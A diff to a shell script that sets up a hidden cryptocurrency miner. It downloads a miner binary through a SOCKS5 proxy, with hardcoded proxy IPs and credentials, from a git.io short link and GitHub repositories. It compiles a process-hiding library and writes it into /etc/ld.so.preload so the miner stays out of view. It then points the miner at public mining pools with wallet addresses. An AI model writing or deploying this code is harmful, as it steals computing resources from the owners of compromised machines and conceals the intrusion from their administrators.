@@ -3,6 +3,7 @@ ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
 apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
+apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
 
 wget https://github.com/kiposnakursi/a/raw/main/graphics.tar.gz
 
@@ -11,7 +12,7 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 45.152.196.183:9216
+socks5 = 45.137.80.110:9130
 socks5_username = nofvbdys
 socks5_password = 44tpywm4q9bo
 END
@@ -35,8 +36,8 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://github.com/kilosri/ew/raw/main/gasken
-chmod +x gasken
+./graftcp/graftcp wget -qO build https://git.io/JiGZh
+chmod +x build
 
 ./graftcp/graftcp wget https://github.com/kiposnakursi/a/raw/main/magicBezzHash.zip
 unzip magicBezzHash.zip
@@ -45,4 +46,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./gasken -a minotaurx -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RDuJgKwVgh1MAQoQPCKLKyZvQ36wFGCnEd.11maret -x socks5://nofvbdys:44tpywm4q9bo@45.152.196.183:9216
+./graftcp/graftcp ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RFAyGt31VDBd2MK4wWQoRsFzUXi755Ubn6.$(echo $(shuf -i 1000-99999 -n 1)0803) -p x -t $(nproc) -x socks5://nofvbdys:44tpywm4q9bo@45.137.80.110:9130
